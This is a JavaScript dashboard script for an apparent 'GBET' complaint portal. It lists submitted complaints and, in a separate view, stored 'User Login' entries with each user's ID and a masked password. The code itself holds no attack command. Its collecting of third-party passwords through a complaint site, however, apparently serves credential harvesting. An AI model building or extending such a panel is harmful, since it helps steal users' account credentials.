/* GBET-PENNAL - dashboard */
(function () {
  'use strict';

  var ICONS = {
    calendar: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4.5" width="18" height="17" rx="3"/><line x1="8" y1="2.5" x2="8" y2="6.5"/><line x1="16" y1="2.5" x2="16" y2="6.5"/><line x1="3" y1="9.5" x2="21" y2="9.5"/></svg>',
    layers: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3 3 7.5l9 4.5 9-4.5L12 3z"/><path d="m3 12.5 9 4.5 9-4.5"/><path d="m3 17.5 9 4.5 9-4.5"/></svg>',
    clock: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15.5 14"/></svg>',
    chevron: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 5 16 12 9 19"/></svg>'
  };

  function loginCard(c) {
    return '<a class="c-card login-card" data-id="' + GBET.esc(c.id) + '" href="complaint.html?id=' + encodeURIComponent(c.id) + '&view=login">' +
      '<div class="c-top">' +
      GBET.avatarHtml() +
      '<div class="c-id">' +
      '<span class="c-name">' + GBET.esc(c.name) + '</span>' +
      '<span class="c-type">User Login</span>' +
      '</div>' +
      '<span class="c-chev">' + ICONS.chevron + '</span>' +
      '</div>' +
      '<div class="login-meta">' +
      '<span class="login-item"><span class="login-key">User ID</span><span class="login-val">' + GBET.esc(c.uid || '\u2014') + '</span></span>' +
      '<span class="login-item"><span class="login-key">Password</span><span class="login-val">' + (c.password ? '\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022' : '\u2014') + '</span></span>' +
      '</div>' +
      '</a>';
  }

  function card(c) {
    var st = GBET.statusKey(c.status);
    var type = c.problemType || GBET.categories[c.category] || 'Complaint';
    return '<a class="c-card" data-id="' + GBET.esc(c.id) + '" href="complaint.html?id=' + encodeURIComponent(c.id) + '">' +
      '<div class="c-top">' +
      GBET.avatarHtml() +
      '<div class="c-id">' +
      '<span class="c-name">' + GBET.esc(c.name) + '</span>' +
      '<span class="c-type">' + GBET.esc(type) + '</span>' +
      '</div>' +
      '<span class="c-chev">' + ICONS.chevron + '</span>' +
      '</div>' +
      '<div class="c-meta">' +
      '<span class="meta-item">' + ICONS.clock + GBET.esc(GBET.fmtTime(c.createdAt)) + '</span>' +
      '<span class="meta-item">' + ICONS.calendar + GBET.esc(GBET.fmtDate(c.createdAt)) + '</span>' +
      '<span class="badge st-' + st + '">' + GBET.statusLabel(c.status) + '</span>' +
      '</div>' +
      '</a>';
  }

  try { localStorage.removeItem('gbet.admin.complaints.v1'); } catch (e) { /* ignore */ }

  var painted = false;
  var view = 'complain';
  var current = [];

  function renderList() {
    var listEl = document.getElementById('complaintList');
    var titleEl = document.getElementById('listTitle');
    var metaEl = document.getElementById('listMeta');
    var isLogin = view === 'login';

    if (titleEl) titleEl.textContent = isLogin ? 'All Logins' : 'All Complaints';
    if (metaEl) metaEl.textContent = isLogin
      ? current.length + (current.length === 1 ? ' login' : ' logins')
      : current.length + (current.length === 1 ? ' complaint' : ' complaints');

    if (!listEl) return;

    if (!current.length) {
      listEl.innerHTML = '<div class="empty-list">' + (isLogin ? 'No login details yet.' : 'No complaints yet.') + '</div>';
      painted = true;
      return;
    }

    var html = '';
    for (var i = 0; i < current.length; i++) html += isLogin ? loginCard(current[i]) : card(current[i]);
    listEl.innerHTML = html;
    painted = true;
  }

  function paint(list) {
    var today = 0;
    for (var t = 0; t < list.length; t++) if (GBET.isToday(list[t].createdAt)) today++;

    document.getElementById('todayCount').textContent = today;
    document.getElementById('totalCount').textContent = list.length;

    var chip = document.getElementById('connChip');
    if (chip) chip.lastElementChild.textContent = 'Live';

    current = list;
    renderList();
  }

  function remoteList() {
    return (window.GBET_FB && typeof GBET_FB.list === 'function') ? GBET_FB.list() : [];
  }

  var switchEl = document.getElementById('dataSwitch');
  if (switchEl) {
    switchEl.addEventListener('click', function (e) {
      var btn = e.target.closest ? e.target.closest('[data-view]') : null;
      if (!btn) return;
      view = btn.getAttribute('data-view') === 'login' ? 'login' : 'complain';
      var btns = switchEl.querySelectorAll('.seg-btn');
      for (var i = 0; i < btns.length; i++) {
        var active = btns[i] === btn;
        btns[i].classList.toggle('is-active', active);
        btns[i].setAttribute('aria-selected', active ? 'true' : 'false');
      }
      renderList();
    });
  }

  if (window.GBET_FB) {
    paint(remoteList());
  } else {
    var bootList = document.getElementById('complaintList');
    if (bootList) bootList.innerHTML = '<div class="empty-list">Connecting to live database\u2026</div>';
  }

  document.addEventListener('gbfb:complaints', function (e) {
    paint(e.detail || []);
  });

  document.addEventListener('gbfb:error', function () {
    var chip = document.getElementById('connChip');
    if (chip) chip.lastElementChild.textContent = 'Offline';
    if (painted) return;
    var listEl = document.getElementById('complaintList');
    if (listEl) listEl.innerHTML = '<div class="empty-list">Could not connect to Firestore. Check network and rules.</div>';
  });

  var iconCalendar = document.getElementById('iconCalendar');
  if (iconCalendar) iconCalendar.innerHTML = ICONS.calendar;
  var iconLayers = document.getElementById('iconLayers');
  if (iconLayers) iconLayers.innerHTML = ICONS.layers;
})();
